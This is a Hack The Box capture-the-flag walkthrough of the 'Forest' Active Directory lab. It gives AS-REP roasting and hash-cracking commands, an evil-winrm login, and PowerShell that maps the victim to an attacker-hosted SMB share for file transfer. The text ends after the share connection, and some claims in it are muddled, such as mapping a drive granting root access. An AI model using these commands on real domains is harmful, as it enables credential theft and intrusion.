---
title: "Forest HTB"
date: 2024-08-07 20:17:41 +0800
categories: [Forest, Medium]
tags: [Forest, HTB, HTB Walkthrough]
---



Summary
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*dXRZJfXkJbQkwH4ZerHHPw.png

The article provides a detailed walkthrough of compromising an Active Directory machine on Hack The Box (HTB), named Forest, including reconnaissance, enumeration, exploitation, and privilege escalation techniques.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*38m_4ozFaZe4VKGerMKpyA.png

Abstract
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*2iAr73r4ngg87PpW3I0ylA.png

The author of the article, a cybersecurity enthusiast, documents their journey through attacking the Forest machine on HTB as part of an Active Directory series. The process begins with reconnaissance using tools like Nmap, followed by enumeration with rpcclient, Kerberos, and LDAP searches. The exploitation phase involves cracking Kerberos pre-authentication hashes and using the credentials to access shared services. The article emphasizes the use of tools such as evil-winrm for gaining initial access and SharpHound for domain enumeration. The privilege escalation section covers the use of BloodHound to identify attack paths, the addition of a user to a privileged group for DCSync attacks, and finally, achieving administrative privileges using ntlmrelayx and Impacket's secretsdump.py. The article concludes with a successful demonstration of obtaining the root flag and a reflection on the complexity of the attack.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*Ecnt7aNYh1m_iAUJvnQl3Q.png

Opinions
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*rY2CsH-2OnPmKfz3SX1S0w.png

Forest HTB Retired Machine: Active Directory 02
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*e4tcQmmlIqgSvRo9KP2ajg.png

Series Intro:
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*r5EY3DGSgVtqMX77r4c6Dw.png

Hello Hackers, Today we are gonna attack another HTB retired machine in our Active Directory series for a better practical learning experience for me. As soon as I’m done with this series, I’m gonna make tutorials on each stage of compromising active directory domain controller with detailed mind maps. feel free to follow up If anything interests you.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*70ULGxFkx7Qrl0YQjB_3NA.png

Reconnaissance:
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*FvXmzjMkTPwwCPSXM6lwKA.gif

Analyzing Nmap result:
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*5HTVVemls77y378aB9bYcw.png

We got 135 rpc, 389 ldap, 445 smb & 5985 winrm service open ports.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*pDZtxvFlQGEupNv5VbtJRg.png

Enumeration:
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*jP_6xTw0av0aSi7OCZnZOA.png

Further, after this, Let’s focus on the enumeration of these ports.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*1BmQttIQ5ujYa7WCHA38Lg.png

Tools we can use:
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*1ySPgG-iTBzLJ2sBWAlKmA.png

You can try rpcclient, for Kerberos(Impacket libraries like Getuserspns.py, GetADUsers.py, GetNPUsers.py), smbclient/smbmap & evil-winrm for winrm are common enumeration tools.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*e43OVpgRPv6ygKPRFbowIQ.png

First I started Enumeration with rpcclient & while smbclient those don’t seem to work with an anonymous login. we can also go for an LDAP search or do some LDAP scans for more information. I see that the domain name “htb.local” from
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*cbDP4CNPFgB21IyFxBDAgw.png

namingContexts: DC:htb, DC=local.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*NOsN0JR4c7oEDGRGaFc20w.png

But I just went with Kerberos, Normally for attacking Kerberos we need usernames since, Anonymous Login is allowed & it is successful.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*GbPiTDFR0Gs6pTD6gnoCYA.png

we have something that can be logged in that’s all we need for now.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*gXjAXVCnSRVDGcbfTZfSJA.png

GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*9RCQNEAOKXYgq0Apt5VYTA.png

Yeyy(❁´◡`❁)!! That did give us TGT for some account .
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*3wBh5m7ljf1pKN_ELcJ9VQ.png

Background knowledge on how this was working ASREP-Roasting
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*w1FmeNp6DzTUDIrcBe7hTw.png

ASREP-Roasting
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*vIgTB5HI67kF70xmsefKjA.png

we can see the username and domain name attached to it. I googled cracking krb5asrep hashes. or you search it with hashcat,
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*PRzkpGVcmPvI5CA8KWRGUw.png

hashcat -h | grep -i “AS-REP” for offline approach.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*nqp1W4QzXhL8NbQg4oK81Q.png

And done, we just got our first credentials😁. Let’s try this out on the services we already know.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*LZuFwS23lfDfr4VsWRSnmw.png

Exploitation:
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*ay5A2Onbfx3d8xgaQ2GeUQ.png

we can see that, we still have only read-access on the shares which wasn’t preventing us from getting a shell with these shares.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*olE1-t1Zp-PWaF5_bdlkjA.png

Saving up the hassle for you, I tried smbclient but it got me nowhere.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*DM6KQCKSstbwmn-HRmabsg.png

Since We also got the Winrm remote management service for this machine. which would normally used by system administrators to access the machine using remote management. A quick tool that can come to my mind is gonna be, Evil-winrm.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*TGnGrQCQIFbyx9Mm6RC4dg.png

Tada!!! We got the User flag!!!!!!!!!!!!!!!!!!
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*YOaN2fJrnR2H90f01kQSyQ.png

Done?? Not yet!!
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*Y3qF2FgBLj0imJoSl7PJZg.png

Priv-Escalation as Administrator:
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*sKlmM5KZRWcZiAxBQX3nJw.png

After trying tried run Privilege Escalation methods like winpeasx64 and Windows local exploit suggesters. Since we are getting information out of LDAP. Seems like it is less authenticated.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*nCwrQSz19o1oLKZTeaT9aA.png

We can fire up Bloodhound on the victim machine and Gather all information on the domain controller in one place. It might get intimidating but we are just gathering enumerating domain information through BloodHound here.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*N5eqM-zWpjcm0mupqYzRUA.png

We will be needing a smbserver connection between the alfresco machine and Kali for easy file transfer. Most of the time we will be getting smb shell. So, this is better in that case.     
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*TuCoz17Sh748rvfnIWuP6g.png

For that, Step 1: we need to start a smbserver on our end to get access from our victim as a share. for better file transfer.
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*QP9Fpa5wqFXPEpLo8qgQDA.gif

sudo impacket-smbserver tmp $(pwd) -smb2support -user smbserver -password anypassword
https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*VAKgNxddT-bWgWaHyT6Vbg.png

Step 2: Then to access this share of ours on the victim machine do the following commands.
https://miro.readmedium.com/v2/resize:fill:88:88/1*SUoFvr46ph7l29W8B5W6VA.png

Step 3: Finally, Creating a drive with this share while Assigning it as the root directory can give us root access.
https://miro.readmedium.com/v2/resize:fill:88:88/1*v1ya57W4uJxUiwT02c8dCA.png

Complete these three steps:
https://miro.readmedium.com/v2/resize:fill:88:88/1*l5fK8FSzNIoABmkxgZZhHg.png

$pass = convertto-securestring ‘anypassword’ -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential (‘servername’, $pass)
https://miro.readmedium.com/v2/resize:fill:88:88/1*cwYWYCjbeXNc_pAtTeq_Zg.jpeg

New-PSDrive -Name anyname -PSProvider FileSystem -Credential $cred -Root \\10.10.x.x\tmp
https://miro.readmedium.com/v2/resize:fill:88:88/1*VX67EZEBNQ0b6-vuizdTPw.png

SMB Share Connection is Established.
https://miro.readmedium.com/v2/resize:fill:88:88/0*isqPwKeV9B4Uh73Q